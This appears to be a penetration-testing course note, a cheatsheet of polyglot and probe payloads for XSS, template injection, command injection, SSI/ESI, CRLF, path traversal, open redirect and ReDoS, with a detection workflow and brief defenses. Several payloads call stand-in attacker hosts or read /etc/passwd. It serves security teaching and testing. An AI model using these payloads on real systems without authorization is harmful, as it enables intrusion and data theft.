---
tags: [vapt, xss, polyglot, payloads, cheatsheet, detection, intermediate]
difficulty: intermediate
module: "07 - XSS"
topic: "07.23 Polyglot & PoC Payload Cheatsheet"
---

# 07.23 — Polyglot & PoC Payload Cheatsheet

## What is it?
A **polyglot** is a single payload crafted to **trigger (or at least probe) several different vulnerability classes at once**, and to survive many injection contexts (HTML attribute, JS string, comment, tag body…). Instead of firing 20 separate test strings, you drop one polyglot and watch what breaks. They're a fast **first-pass detection** tool — once something reacts, you switch to a focused, context-specific payload.

Think of a polyglot like a skeleton key shaved to catch many locks: it won't open every door cleanly, but it rattles enough pins that you learn which doors are pickable, then you cut a proper key.

> Use polyglots to **detect**; use targeted payloads to **exploit**. Always test against authorized targets only.

## Mega-polyglots (multi-class)
**Template injection (SSTI + CSTI):**
```text
{{7*7}}[7*7]
{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}${{<%[%'"}}%\
```

**Command injection (time-based, multi-context):**
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

**SSI / ESI combined:**
```html
<!--#echo var="DATE_LOCAL" --><!--#exec cmd="ls" --><esi:include src=http://attacker.com/>x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
```

**XSLT + ESI:**
```html
<xsl:value-of select="system-property('xsl:version')" /><esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl"></esi:include>
```

## Per-class detection payloads

### XSS — basic probes
```html
" onclick=alert() a="
'"><img src=x onerror=alert(1) />
javascript:alert()
```

### XSS — heavy polyglots (context-breaking)
```text
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
-->'"/></sCript><deTailS open x=">" ontoggle=(confirm)``>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+document.location=`//localhost/mH`//'>
```

### Command injection — basic
```bash
;ls
||ls;
|ls;
&&ls;
&ls;
%0Als
`ls`
$(ls)
```

### CRLF injection
```text
%0d%0aLocation:%20http://attacker.com
%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```

### File inclusion / path traversal
```text
/etc/passwd
../../../../../../etc/hosts
..\..\..\..\..\..\etc/hosts
C:/windows/system32/drivers/etc/hosts
../../../../../../windows/system32/drivers/etc/hosts
http://asdasdasdasd.burpcollab.com/mal.php
\\asdasdasdasd.burpcollab.com/mal.php
```

### Open Redirect / SSRF
```text
www.whitelisted.com
www.whitelisted.com.evil.com
https://google.com
//google.com
javascript:alert(1)
```

### ReDoS (catastrophic backtracking)
```text
(\w*)+$
([a-zA-Z]+)*$
((a+)+)+$
```

### SSTI — basic probes
```text
${{<%[%'"}}%\
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

### Dangling markup
```html
<br><b><h1>THIS IS AN INJECTED TITLE </h1>
```

## ASCII Diagram
```text
================================================================================
                       POLYGLOT FIRST-PASS WORKFLOW
================================================================================

  drop ONE polyglot into the input
            |
            v
  observe reactions across classes:
    49 / 0 in output ........ SSTI/CSTI evaluated
    delayed response ........ command injection (sleep)
    alert / JS exec ......... XSS context broke out
    new response header ..... CRLF injection
    /etc/passwd contents .... path traversal / LFI
            |
            v
  switch to a FOCUSED, context-specific payload to exploit
================================================================================
```

## Hands-on usage
1. Identify every reflected/processed input (params, headers, JSON fields, filenames).
2. Inject a **mega-polyglot** first; note which class reacts.
3. Confirm with the matching **basic probe** for that class.
4. Move to the dedicated module for full exploitation (e.g. [[../I - 10 - Injection Attacks/19 - Server-Side Includes (SSI) and Edge-Side Includes (ESI) Injection]], [[../I - 09 - SSTI/01 - What is SSTI]]).

## Defense
Polyglots only *reveal* existing bugs — the fixes are the per-class defenses: context-aware output encoding (XSS), strip CR/LF (CRLF), parameterised commands (cmd injection), canonicalise + allowlist paths (LFI), disable template/SSI/XSLT evaluation of user input.

## Related
- [[21 - XSS Payloads Comprehensive List]] — deeper XSS-only payload set
- [[../I - 10 - Injection Attacks/01 - Injection Overview]] — class-by-class exploitation
